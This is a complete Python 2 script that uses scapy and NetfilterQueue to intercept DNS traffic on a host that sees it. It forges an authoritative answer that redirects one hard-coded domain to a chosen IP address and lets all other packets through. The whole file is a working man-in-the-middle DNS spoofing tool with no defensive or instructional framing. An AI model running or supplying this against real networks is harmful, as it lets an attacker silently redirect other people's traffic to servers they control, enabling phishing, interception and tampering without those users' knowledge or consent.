from scapy.all import *
from netfilterqueue import NetfilterQueue

spoofDomain = 'www.youporn.com'
spoofResolvedIp = '1.1.1.1'
queueId = 1

def dnsSpoof(packet):
        originalPayload = IP( packet.get_payload() )

        if not originalPayload.haslayer(DNSQR):
                # Not a dns query, accept and go on
                packet.accept()
        else:
                if spoofDomain in originalPayload[DNS].qd.qname:
                        print "Intercepted DNS request for " + spoofDomain + ": " + originalPayload.summary()

                        # Build the spoofed response
                        spoofedPayload = IP(dst=originalPayload[IP].dst, src=originalPayload[IP].src)/\
                          UDP(dport=originalPayload[UDP].dport, sport=originalPayload[UDP].sport)/\
                          DNS(id=originalPayload[DNS].id, qr=1, aa=1, qd=originalPayload[DNS].qd,\
                          an=DNSRR(rrname=originalPayload[DNS].qd.qname, ttl=10, rdata=spoofResolvedIp))

                        print "Spoofing DNS response to: " + spoofedPayload.summary()
                        packet.set_payload(str(spoofedPayload))
                        packet.accept()
                        print "------------------------------------------"
                else:
                        # DNS query but not for target spoofDomain, accept and go on
                        packet.accept()

# bind the callback function to the queue
nfqueue = NetfilterQueue()
nfqueue.bind(queueId, dnsSpoof)

# wait for packets
try:
        print "Intercepting nfqueue: " + str(queueId)
        print "Spoofing " + spoofDomain + " to " + spoofResolvedIp
        print "------------------------------------------"
        nfqueue.run()
except KeyboardInterrupt:
        pass
